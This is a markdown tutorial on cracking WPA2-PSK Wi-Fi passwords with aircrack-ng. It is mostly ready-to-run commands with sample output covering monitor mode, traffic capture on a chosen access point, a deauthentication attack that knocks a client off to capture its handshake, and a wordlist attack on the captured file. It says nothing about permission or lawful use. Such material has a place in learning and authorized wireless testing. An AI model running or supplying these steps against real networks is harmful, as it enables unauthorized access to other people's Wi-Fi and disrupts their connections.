# Cracking WPA2-PSK Passwords Using Aircrack-Ng (Brute Force) 

1. Put Wi-Fi Adapter in Monitor Mode with Airmon-Ng - It allows us to see all of the wireless traffic that passes by us in the air. 
```bash
    [root] airmon-ng start wlan0
    PHY	Interface	Driver		Chipset

    phy0	wlp9s0f0	rt2800pci	Ralink corp. RT3290 Wireless 802.11n 1T/1R PCIe

		(mac80211 monitor mode vif enabled for [phy0]wlp9s0f0 on [phy0]wlp9s0f0mon)
		(mac80211 station mode vif disabled for [phy0]wlp9s0f0)

```

2. Note that airmon-ng has renamed your wlan0 adapter to wlp9s0f0mon.
```bash
    [root] iwconfig
    wlp9s0f0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
          
enp8s0    no wireless extensions.

lo        no wireless extensions.

```

3. Capture Traffic with Airodump-Ng
    - It grabs all the traffic that your wireless adapter can see and displays critical information about it, including the BSSID (the MAC address of the AP), power, number of beacon frames, number of data frames, channel, speed, encryption (if any), and finally, the ESSID (what most of us refer to as the SSID). 
    - Note all of the visible APs are listed in the upper part of the screen and the clients are listed in the lower part of the screen
```bash
    [root] airodump-ng wlp9s0f0mon
    
```

4. Focus Airodump-Ng on One AP on One Channel
    - Our next step is to focus our efforts on one AP, on one channel, and capture critical data from it. We need the BSSID and channel to do this. Let's open another terminal and type:
```bash
    [root] airodump-ng --bssid 08:86:30:74:22:76 -c 6 --write WPAcrack wlp9s0f0mon
```
- `08:86:30:74:22:76` is the `BSSID` of the AP
- `-c 6` is the channel the AP is operating on
- WPAcrack is the file you want to write to
- wlp9s0f0mon is the monitoring wireless adapter*

5. Aireplay-Ng Deauth
    - In order to capture the encrypted password, we need to have the client authenticate against the AP. 
    - If they're already authenticated, we can de-authenticate them (kick them off) and their system will automatically re-authenticate, whereby we can grab their encrypted password in the process. Let's open another terminal and type:
```bash
    [root] aireplay-ng --deauth 100 -a 08:86:30:74:22:76 -c 54:DC:1D:4C:39:96 wlp9s0f0mon
```    
- `100` is the number of de-authenticate frames you want to send
- `08:86:30:74:22:76` is the BSSID of the AP
- `54:DC:1D:4C:39:96` is the BSSID of the Client
- `wlp9s0f0mon` is the monitoring wireless adapter

6. Capture the Handshake
    - In the previous step, we bounced the user off their own AP, and now when they re-authenticate, airodump-ng will attempt to grab their password in the new 4-way handshake. 
    - Let's go back to our airodump-ng terminal and check to see whether or not we've been successful.
    - "WPA handshake." on top right conor.

7. Let's Aircrack-Ng That Password!    
    -  that we have the encrypted password in our file WPAcrack, we can run that file against aircrack-ng using a password file of our choice. 
    - Remember that this type of attack is only as good as your password file. 
```bash
    [root] aircrack-ng WPAcrack-01.cap -w /pentest/passwords/wordlists/darkc0de
```    

## References
- [Nullbyte - Cracking WPA2-PSK Passwords Using Aircrack-Ng](https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/)
- [AirCrack-Ng - Docs](https://www.aircrack-ng.org/documentation.html)
- [AirCrack-Ng - Tutorials](https://www.aircrack-ng.org/doku.php?id=tutorial)